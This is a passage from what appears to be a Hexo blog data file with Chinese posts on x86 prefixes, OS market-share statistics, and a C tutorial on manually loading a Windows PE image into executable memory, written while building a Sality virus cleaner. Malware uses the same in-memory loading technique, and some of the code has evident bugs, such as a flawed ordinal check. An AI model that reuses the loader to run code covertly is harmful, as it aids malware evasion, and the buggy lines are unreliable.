src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175201.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200215175201.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215174932.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200215174932.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175337.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200215175337.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://bbs.pediy.com/thread-77508.htm\" target=\"_blank\" rel=\"noopener\">https://bbs.pediy.com/thread-77508.htm</a><br><a href=\"https://blog.csdn.net/Apollon_krj/article/details/77524601\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Apollon_krj/article/details/77524601</a><br>x86指令集设计上就只允许是寄存器和寄存器或寄存器和内存间移动</p>\n<p>x86 profix:<br>26：在指令序列里是：prefix部分，作用是调整内存操作数的段选择子<br>66：在指令序列里是：prefix 部分，作用是调整操作数的缺省大小<br>2E: CS<br>3E: DS<br>26: ES<br>64: FS<br>65: GS<br>36: SS<br>F0: locl指令<br>F2: repne<br>F3: rep repz</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214220708.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200214220708.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221252.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200214221252.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221520.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200214221520.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175201.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200215175201.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215174932.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200215174932.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175337.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200215175337.png\"></p>\n"},{"title":"一个数据统计公司","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217101951.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217101951.png","date":"2019-12-10T02:00:00.000Z","_content":"\n数据是无价的，这里给一个可以查看目前操作系统，浏览器，搜索引擎等等的使用比例\n\n## 最受欢迎的操作系统\n\n![20191211143848.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211143848.png)\n\n`windows` 毫不意外的以`87%`的份额获得了第一\n\n## 最受欢迎的搜索引擎\n\n\n![20191211144118.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211144118.png)\n\n百度能这么多也基本都是国内的资源\n\n\n\n\n以上数据全来源[netmarketshare](https://www.netmarketshare.com/)\n","source":"_posts/数据统计网站.md","raw":"\n---\ntitle: 一个数据统计公司\ntags: [其他]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217101951.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217101951.png\ndate: 2019-12-10 10:00:00\n---\n\n数据是无价的，这里给一个可以查看目前操作系统，浏览器，搜索引擎等等的使用比例\n\n## 最受欢迎的操作系统\n\n![20191211143848.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211143848.png)\n\n`windows` 毫不意外的以`87%`的份额获得了第一\n\n## 最受欢迎的搜索引擎\n\n\n![20191211144118.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211144118.png)\n\n百度能这么多也基本都是国内的资源\n\n\n\n\n以上数据全来源[netmarketshare](https://www.netmarketshare.com/)\n","slug":"数据统计网站","published":1,"updated":"2019-12-17T02:28:16.025Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c0026ccuq8tlt9n3q","content":"<p>数据是无价的，这里给一个可以查看目前操作系统，浏览器，搜索引擎等等的使用比例</p>\n<h2 id=\"最受欢迎的操作系统\"><a href=\"#最受欢迎的操作系统\" class=\"headerlink\" title=\"最受欢迎的操作系统\"></a>最受欢迎的操作系统</h2><p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211143848.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191211143848.png\"></p>\n<p><code>windows</code> 毫不意外的以<code>87%</code>的份额获得了第一</p>\n<h2 id=\"最受欢迎的搜索引擎\"><a href=\"#最受欢迎的搜索引擎\" class=\"headerlink\" title=\"最受欢迎的搜索引擎\"></a>最受欢迎的搜索引擎</h2><p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211144118.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191211144118.png\"></p>\n<p>百度能这么多也基本都是国内的资源</p>\n<p>以上数据全来源<a href=\"https://www.netmarketshare.com/\" target=\"_blank\" rel=\"noopener\">netmarketshare</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>数据是无价的，这里给一个可以查看目前操作系统，浏览器，搜索引擎等等的使用比例</p>\n<h2 id=\"最受欢迎的操作系统\"><a href=\"#最受欢迎的操作系统\" class=\"headerlink\" title=\"最受欢迎的操作系统\"></a>最受欢迎的操作系统</h2><p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211143848.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191211143848.png\"></p>\n<p><code>windows</code> 毫不意外的以<code>87%</code>的份额获得了第一</p>\n<h2 id=\"最受欢迎的搜索引擎\"><a href=\"#最受欢迎的搜索引擎\" class=\"headerlink\" title=\"最受欢迎的搜索引擎\"></a>最受欢迎的搜索引擎</h2><p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191211144118.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191211144118.png\"></p>\n<p>百度能这么多也基本都是国内的资源</p>\n<p>以上数据全来源<a href=\"https://www.netmarketshare.com/\" target=\"_blank\" rel=\"noopener\">netmarketshare</a></p>\n"},{"title":"简单PE加载器","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121346.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121346.png","date":"2019-12-07T13:28:01.000Z","_content":"\n\n思路来源写`Sality`感染型病毒专杀时指令被严重混淆，通过加载PE 修改内存 跑一下解密算法效率是最高的。\n\n\n\n很多病毒在运行的时候都会加载另一个主映像文件去执行，而不是创建进程，就很有意思\n\n下面就是如何加载一个PE，再展开，最后修复执行的过程 \n\n该函数主要是为了将文件映射到内存中，保证源程序安全\n\n返回值是未展开文件在内存中的位置\n\n```C\nLPBYTE LoadFileToMem(LPCSTR lpFilePath)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////将源文件读到内存中                                                  ///\n\t//////////////////////////////////////////////////////////////////////////\n\tDWORD FileSize = 0;\n\tLPBYTE Buff = NULL;\n\n\tHANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\tif (hFile == INVALID_HANDLE_VALUE)\n\t{\n\t\tprintf(\"打开文件句柄错误！[%x]\", GetLastError());\n\t\treturn -1;\n\t}\n\n\tFileSize = GetFileSize(hFile, NULL);\n\n\tBuff = (LPBYTE)malloc(FileSize);\n\tif (Buff == NULL)\n\t{\n\t\tprintf(\"空间申请失败![%x]\", GetLastError());\n\t\treturn -1;\n\t}\n\n\tif (!ReadFile(hFile, Buff, FileSize, &FileSize, NULL))\n\t{\n\t\tprintf(\"ReadFile![%x]\", GetLastError());\n\t\treturn -1;\n\t}\n\treturn Buff;\n}\n```\n\n\n\n接下来按照各个节的对齐粒度展开\n返回值是展开后什么都没修复的buff指针\n\n```C\nLPBYTE Extension(LPBYTE lpFileBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////将文件在内存中展开                                                  ///\n\t//////////////////////////////////////////////////////////////////////////\n\tint i = 0; \n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpFileBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpFileBuffer + pDos->e_lfanew);\n\tPIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + sizeof(IMAGE_NT_HEADERS));\n\n\tDWORD ImageSize = pNt->OptionalHeader.SizeOfImage;\n\n\t//LPBYTE lpMemBuffer = (LPBYTE)malloc(ImageSize);\n\tLPVOID lpMemBuffer = VirtualAlloc(NULL, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n\tVirtualProtect(lpMemBuffer, ImageSize, PAGE_EXECUTE_READWRITE, NULL);//这一句可以不要，上面申请的就是可读可写可执行的空间。\n\n\tZeroMemory(lpMemBuffer, ImageSize);\n\n\t//文件头的大小\n\tDWORD dwSizeOfHeader = pNt->OptionalHeader.SizeOfHeaders;\n\n\t//将头部拷贝过去\n\tCopyMemory(lpMemBuffer, lpFileBuffer, dwSizeOfHeader);\n\n\n\tfor (;i < pNt->FileHeader.NumberOfSections;i++)\n\t{\n\t\tif (pSec->VirtualAddress == 0 || pSec->PointerToRawData == 0)\n\t\t{\n\t\t\tpSec++;\n\t\t\tcontinue;\n\t\t}\n\t\tCopyMemory((LPBYTE)lpMemBuffer + pSec->VirtualAddress, lpFileBuffer + pSec->PointerToRawData, pSec->SizeOfRawData);\n\t\tpSec++;\n\t}\n\n\t//已经完全映射，可以把之前的内存释放掉了\n\tfree(lpFileBuffer);\n\treturn lpMemBuffer;\n}\n```\n\n修复重定位信息\n\n这一步容易出错，核心原理是重定位表中存的是这个程序需要修复的数据，每个数据都是`DWORD`类型的\n可以参考如下地址，主要要注意 `pReloca->VirtualAddress`存的是页基质 , `pReloca->SizeOfBlock` 包含了`IMAGE_BASE_RELOCATION` 结构的大小\nhttps://blog.csdn.net/Apollon_krj/article/details/77370452\n\n```C\nBOOL ReRloc(LPBYTE lpMemBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////修复重定位表                                                       ///\n\t////原理：遍历重定位表，计算需要重定位数据的地址：重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址\n\t//////////////////////////////////////////////////////////////////////////\n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos->e_lfanew);\n\t//获得重定位表\n\tPIMAGE_BASE_RELOCATION pReloca = (PIMAGE_BASE_RELOCATION)(lpMemBuffer + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\n\t\n\t//如果重定位表为空，上述表达式为pDos+0\n\tif ((LPBYTE)pReloca == lpMemBuffer)\n\t{\n\t\tprintf(\"没有重定位表！\\n\");\n\t\treturn TRUE;\n\t}\n\n\twhile (pReloca->VirtualAddress !=0 && pReloca->SizeOfBlock !=0 )\n\t{\n\t\tLPWORD pRelData =  (LPBYTE)pReloca + sizeof(IMAGE_BASE_RELOCATION);\n\t\tint nNumRel = (pReloca->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n\t\tfor (int i = 0; i < nNumRel; i++)\n\t\t{\n\t\t\t// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。\n\t\t\t// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。\n\n\t\t\tif ((WORD)(pRelData[i] & 0xF000) == 0x3000) //这是一个需要修正的地址\n\t\t\t{\n\t\t\t\t//pReloca->VirtualAddress存的是页基质，(一个页4K，所以是0xFFF，刚好12位)\n\t\t\t\tLPDWORD pAddress = (LPDWORD)(lpMemBuffer + pReloca->VirtualAddress + (pRelData[i] & 0x0FFF));\n\n\n\t\t\t\t*pAddress = *pAddress - pNt->OptionalHeader.ImageBase + (DWORD)pDos;\n\n\t\t\t\tprintf(\"Check!\");\n\t\t\t\t//DWORD dwDelta = (DWORD)pDos - pNt->OptionalHeader.ImageBase;\n\t\t\t\t//*pAddress += dwDelta;\n\t\t\t}\n\t\t}\n\t\tpReloca = (LPBYTE)pReloca + pReloca->SizeOfBlock;\n\t}\n\tprintf(\"重定位表修复完成！\\n\");\n\treturn TRUE;\n}\n\n```\n\n修复IAT 这一步也是必须的，在很多壳中是对IAT表进行了Hook，了解一下结构\n\n`WinNt.h`中定义的`IMAGE_IMPORT_DESCRIPTOR`结构\n```C\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR {\n    union {                                 //注意这是union\n        DWORD   Characteristics;            // 0 for terminating null import descriptor\n        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)\n    } DUMMYUNIONNAME;\n    DWORD   TimeDateStamp;                  // 0 if not bound,\n                                            // -1 if bound, and real date\\time stamp\n                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)\n                                            // O.W. date/time stamp of DLL bound to (Old BIND)\n\n    DWORD   ForwarderChain;                 // -1 if no forwarders\n    DWORD   Name;\n    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)\n} IMAGE_IMPORT_DESCRIPTOR;\ntypedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;\n```\n\n`OriginalFirstThunk` 和 `FirstThunk` 都指向一个 `IMAGE_THUNK_DATA32` 结构，该结构是以`0` 结尾\n\n`OriginalFirstThunk` 是一直不会被修改，程序构建好后就固定 INT\n`FirstThunk` 在程序加载时动态修改为具体的函数地址，也就是我们常说的IAT\n\n```C\ntypedef struct _IMAGE_THUNK_DATA32 {\n    union {\n        DWORD ForwarderString;      // PBYTE \n        DWORD Function;             // PDWORD\n        DWORD Ordinal;\n        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME\n    } u1;\n} IMAGE_THUNK_DATA32;\ntypedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;\n```\n\n根据Ordinal的值，判断是按序号导入还是按名称导入，如果是按名称导入则需要去`AddressOfData`指向的`IMAGE_IMPORT_BY_NAME`结构中去拿到导入函数名\n```C\ntypedef struct _IMAGE_IMPORT_BY_NAME {\n    WORD    Hint;\n    CHAR   Name[1];                 //保存具体导入函数的名称\n} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;\n```\n\n如果是序号导入就根据`Ordinal`的`低16`位决定\n\nhttps://www.cnblogs.com/night-ride-depart/p/5776107.html\n\n\n```C\nBOOL InitIAT(LPBYTE lpMemBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////修复IAT                                                            \n\t//////////////////////////////////////////////////////////////////////////\n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos->e_lfanew);\n\tPIMAGE_IMPORT_DESCRIPTOR pImportTalbe = (PIMAGE_IMPORT_DESCRIPTOR)(lpMemBuffer + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n\tLPCSTR szDllname = NULL;\n\tPIMAGE_THUNK_DATA lpOrgNameArry = NULL;\n\tPIMAGE_THUNK_DATA lpFirNameArry = NULL;\n\tPIMAGE_IMPORT_BY_NAME lpImportByNameTable = NULL;\n\tHMODULE hMou;\n\tFARPROC Funaddr;\n\tint i = 0;\n\n\twhile (pImportTalbe->OriginalFirstThunk)\n\t{\n\t\tszDllname = lpMemBuffer + pImportTalbe->Name;\n\t\thMou = GetModuleHandleA(szDllname);\n\t\tif (hMou == NULL)\n\t\t{\n\t\t\thMou = LoadLibraryA(szDllname);\n\t\t\tif (hMou == NULL)\n\t\t\t{\n\t\t\t\tprintf(\"加载%s失败！[%x]\\n \", szDllname, GetLastError());\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t}\n\n\t\t//dll加载成功，开始导入需要的函数\n\t\tlpOrgNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe->OriginalFirstThunk);\n\n\t\tlpFirNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe->FirstThunk);\n\n\t\ti = 0;\n\n\t\twhile (lpOrgNameArry[i].u1.AddressOfData)\n\t\t{\n\t\t\tlpImportByNameTable = (PIMAGE_IMPORT_BY_NAME)(lpMemBuffer + lpOrgNameArry[i].u1.AddressOfData);\n\n\t\t\tif (lpOrgNameArry[i].u1.Ordinal & 0x80000000 == 1)\n\t\t\t{\n\t\t\t\t//序号导入\n\t\t\t\tFunaddr = GetProcAddress(hMou, (LPSTR)(lpOrgNameArry[i].u1.Ordinal & 0xFFFF));\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t//名称导入\n\t\t\t\tFunaddr = GetProcAddress(hMou, lpImportByNameTable->Name);\n\t\t\t}\n\n\t\t\tlpFirNameArry[i].u1.Function = Funaddr;\n\t\t\ti++;\n\t\t}\n\t\tpImportTalbe++;\n\t}\n\treturn TRUE;\n}\n```\n\n最后就是修复`ImageBase`\n\n```C\nFARPROC InitEnv(LPBYTE lpMemBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////修改ImageBase，返回入口点                                           ///\n\t//////////////////////////////////////////////////////////////////////////\n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos->e_lfanew);\n\tpNt->OptionalHeader.ImageBase = lpMemBuffer;\n\t\n\treturn lpMemBuffer + pNt->OptionalHeader.AddressOfEntryPoint;\n}\n```\n\n返回这个被加载程序的入口地址，直接调用就好\n\n\n\n吃水不忘挖井人 参考来源\nhttps://bbs.pediy.com/thread-249133.htm\n\n","source":"_posts/简单PE加载器.md","raw":"---\ntitle: 简单PE加载器\ntags: [逆向]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121346.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121346.png\ndate: 2019-12-07 21:28:01\n---\n\n\n思路来源写`Sality`感染型病毒专杀时指令被严重混淆，通过加载PE 修改内存 跑一下解密算法效率是最高的。\n\n\n\n很多病毒在运行的时候都会加载另一个主映像文件去执行，而不是创建进程，就很有意思\n\n下面就是如何加载一个PE，再展开，最后修复执行的过程 \n\n该函数主要是为了将文件映射到内存中，保证源程序安全\n\n返回值是未展开文件在内存中的位置\n\n```C\nLPBYTE LoadFileToMem(LPCSTR lpFilePath)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////将源文件读到内存中                                                  ///\n\t//////////////////////////////////////////////////////////////////////////\n\tDWORD FileSize = 0;\n\tLPBYTE Buff = NULL;\n\n\tHANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\tif (hFile == INVALID_HANDLE_VALUE)\n\t{\n\t\tprintf(\"打开文件句柄错误！[%x]\", GetLastError());\n\t\treturn -1;\n\t}\n\n\tFileSize = GetFileSize(hFile, NULL);\n\n\tBuff = (LPBYTE)malloc(FileSize);\n\tif (Buff == NULL)\n\t{\n\t\tprintf(\"空间申请失败![%x]\", GetLastError());\n\t\treturn -1;\n\t}\n\n\tif (!ReadFile(hFile, Buff, FileSize, &FileSize, NULL))\n\t{\n\t\tprintf(\"ReadFile![%x]\", GetLastError());\n\t\treturn -1;\n\t}\n\treturn Buff;\n}\n```\n\n\n\n接下来按照各个节的对齐粒度展开\n返回值是展开后什么都没修复的buff指针\n\n```C\nLPBYTE Extension(LPBYTE lpFileBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////将文件在内存中展开                                                  ///\n\t//////////////////////////////////////////////////////////////////////////\n\tint i = 0; \n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpFileBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpFileBuffer + pDos->e_lfanew);\n\tPIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + sizeof(IMAGE_NT_HEADERS));\n\n\tDWORD ImageSize = pNt->OptionalHeader.SizeOfImage;\n\n\t//LPBYTE lpMemBuffer = (LPBYTE)malloc(ImageSize);\n\tLPVOID lpMemBuffer = VirtualAlloc(NULL, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n\tVirtualProtect(lpMemBuffer, ImageSize, PAGE_EXECUTE_READWRITE, NULL);//这一句可以不要，上面申请的就是可读可写可执行的空间。\n\n\tZeroMemory(lpMemBuffer, ImageSize);\n\n\t//文件头的大小\n\tDWORD dwSizeOfHeader = pNt->OptionalHeader.SizeOfHeaders;\n\n\t//将头部拷贝过去\n\tCopyMemory(lpMemBuffer, lpFileBuffer, dwSizeOfHeader);\n\n\n\tfor (;i < pNt->FileHeader.NumberOfSections;i++)\n\t{\n\t\tif (pSec->VirtualAddress == 0 || pSec->PointerToRawData == 0)\n\t\t{\n\t\t\tpSec++;\n\t\t\tcontinue;\n\t\t}\n\t\tCopyMemory((LPBYTE)lpMemBuffer + pSec->VirtualAddress, lpFileBuffer + pSec->PointerToRawData, pSec->SizeOfRawData);\n\t\tpSec++;\n\t}\n\n\t//已经完全映射，可以把之前的内存释放掉了\n\tfree(lpFileBuffer);\n\treturn lpMemBuffer;\n}\n```\n\n修复重定位信息\n\n这一步容易出错，核心原理是重定位表中存的是这个程序需要修复的数据，每个数据都是`DWORD`类型的\n可以参考如下地址，主要要注意 `pReloca->VirtualAddress`存的是页基质 , `pReloca->SizeOfBlock` 包含了`IMAGE_BASE_RELOCATION` 结构的大小\nhttps://blog.csdn.net/Apollon_krj/article/details/77370452\n\n```C\nBOOL ReRloc(LPBYTE lpMemBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////修复重定位表                                                       ///\n\t////原理：遍历重定位表，计算需要重定位数据的地址：重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址\n\t//////////////////////////////////////////////////////////////////////////\n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos->e_lfanew);\n\t//获得重定位表\n\tPIMAGE_BASE_RELOCATION pReloca = (PIMAGE_BASE_RELOCATION)(lpMemBuffer + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\n\t\n\t//如果重定位表为空，上述表达式为pDos+0\n\tif ((LPBYTE)pReloca == lpMemBuffer)\n\t{\n\t\tprintf(\"没有重定位表！\\n\");\n\t\treturn TRUE;\n\t}\n\n\twhile (pReloca->VirtualAddress !=0 && pReloca->SizeOfBlock !=0 )\n\t{\n\t\tLPWORD pRelData =  (LPBYTE)pReloca + sizeof(IMAGE_BASE_RELOCATION);\n\t\tint nNumRel = (pReloca->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n\t\tfor (int i = 0; i < nNumRel; i++)\n\t\t{\n\t\t\t// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。\n\t\t\t// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。\n\n\t\t\tif ((WORD)(pRelData[i] & 0xF000) == 0x3000) //这是一个需要修正的地址\n\t\t\t{\n\t\t\t\t//pReloca->VirtualAddress存的是页基质，(一个页4K，所以是0xFFF，刚好12位)\n\t\t\t\tLPDWORD pAddress = (LPDWORD)(lpMemBuffer + pReloca->VirtualAddress + (pRelData[i] & 0x0FFF));\n\n\n\t\t\t\t*pAddress = *pAddress - pNt->OptionalHeader.ImageBase + (DWORD)pDos;\n\n\t\t\t\tprintf(\"Check!\");\n\t\t\t\t//DWORD dwDelta = (DWORD)pDos - pNt->OptionalHeader.ImageBase;\n\t\t\t\t//*pAddress += dwDelta;\n\t\t\t}\n\t\t}\n\t\tpReloca = (LPBYTE)pReloca + pReloca->SizeOfBlock;\n\t}\n\tprintf(\"重定位表修复完成！\\n\");\n\treturn TRUE;\n}\n\n```\n\n修复IAT 这一步也是必须的，在很多壳中是对IAT表进行了Hook，了解一下结构\n\n`WinNt.h`中定义的`IMAGE_IMPORT_DESCRIPTOR`结构\n```C\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR {\n    union {                                 //注意这是union\n        DWORD   Characteristics;            // 0 for terminating null import descriptor\n        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)\n    } DUMMYUNIONNAME;\n    DWORD   TimeDateStamp;                  // 0 if not bound,\n                                            // -1 if bound, and real date\\time stamp\n                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)\n                                            // O.W. date/time stamp of DLL bound to (Old BIND)\n\n    DWORD   ForwarderChain;                 // -1 if no forwarders\n    DWORD   Name;\n    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)\n} IMAGE_IMPORT_DESCRIPTOR;\ntypedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;\n```\n\n`OriginalFirstThunk` 和 `FirstThunk` 都指向一个 `IMAGE_THUNK_DATA32` 结构，该结构是以`0` 结尾\n\n`OriginalFirstThunk` 是一直不会被修改，程序构建好后就固定 INT\n`FirstThunk` 在程序加载时动态修改为具体的函数地址，也就是我们常说的IAT\n\n```C\ntypedef struct _IMAGE_THUNK_DATA32 {\n    union {\n        DWORD ForwarderString;      // PBYTE \n        DWORD Function;             // PDWORD\n        DWORD Ordinal;\n        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME\n    } u1;\n} IMAGE_THUNK_DATA32;\ntypedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;\n```\n\n根据Ordinal的值，判断是按序号导入还是按名称导入，如果是按名称导入则需要去`AddressOfData`指向的`IMAGE_IMPORT_BY_NAME`结构中去拿到导入函数名\n```C\ntypedef struct _IMAGE_IMPORT_BY_NAME {\n    WORD    Hint;\n    CHAR   Name[1];                 //保存具体导入函数的名称\n} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;\n```\n\n如果是序号导入就根据`Ordinal`的`低16`位决定\n\nhttps://www.cnblogs.com/night-ride-depart/p/5776107.html\n\n\n```C\nBOOL InitIAT(LPBYTE lpMemBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////修复IAT                                                            \n\t//////////////////////////////////////////////////////////////////////////\n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos->e_lfanew);\n\tPIMAGE_IMPORT_DESCRIPTOR pImportTalbe = (PIMAGE_IMPORT_DESCRIPTOR)(lpMemBuffer + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n\tLPCSTR szDllname = NULL;\n\tPIMAGE_THUNK_DATA lpOrgNameArry = NULL;\n\tPIMAGE_THUNK_DATA lpFirNameArry = NULL;\n\tPIMAGE_IMPORT_BY_NAME lpImportByNameTable = NULL;\n\tHMODULE hMou;\n\tFARPROC Funaddr;\n\tint i = 0;\n\n\twhile (pImportTalbe->OriginalFirstThunk)\n\t{\n\t\tszDllname = lpMemBuffer + pImportTalbe->Name;\n\t\thMou = GetModuleHandleA(szDllname);\n\t\tif (hMou == NULL)\n\t\t{\n\t\t\thMou = LoadLibraryA(szDllname);\n\t\t\tif (hMou == NULL)\n\t\t\t{\n\t\t\t\tprintf(\"加载%s失败！[%x]\\n \", szDllname, GetLastError());\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t}\n\n\t\t//dll加载成功，开始导入需要的函数\n\t\tlpOrgNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe->OriginalFirstThunk);\n\n\t\tlpFirNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe->FirstThunk);\n\n\t\ti = 0;\n\n\t\twhile (lpOrgNameArry[i].u1.AddressOfData)\n\t\t{\n\t\t\tlpImportByNameTable = (PIMAGE_IMPORT_BY_NAME)(lpMemBuffer + lpOrgNameArry[i].u1.AddressOfData);\n\n\t\t\tif (lpOrgNameArry[i].u1.Ordinal & 0x80000000 == 1)\n\t\t\t{\n\t\t\t\t//序号导入\n\t\t\t\tFunaddr = GetProcAddress(hMou, (LPSTR)(lpOrgNameArry[i].u1.Ordinal & 0xFFFF));\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t//名称导入\n\t\t\t\tFunaddr = GetProcAddress(hMou, lpImportByNameTable->Name);\n\t\t\t}\n\n\t\t\tlpFirNameArry[i].u1.Function = Funaddr;\n\t\t\ti++;\n\t\t}\n\t\tpImportTalbe++;\n\t}\n\treturn TRUE;\n}\n```\n\n最后就是修复`ImageBase`\n\n```C\nFARPROC InitEnv(LPBYTE 